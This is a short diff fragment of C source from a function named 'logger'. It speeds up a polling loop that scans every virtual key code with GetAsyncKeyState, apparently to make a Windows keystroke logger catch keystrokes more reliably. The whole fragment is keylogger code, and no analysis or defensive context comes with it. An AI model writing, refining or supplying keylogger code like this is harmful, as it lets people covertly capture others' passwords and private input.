@@ -115,7 +115,7 @@ DWORD WINAPI logger(void)
 	short sScannedKey;
 	while(1)
 	{
-		Sleep((rand() % 50) + 20);
+		Sleep((rand() % 10) + 10);
 		for(sScannedKey=8;sScannedKey<=222;sScannedKey++)
 		{
 			if(GetAsyncKeyState(sScannedKey)==-32767)
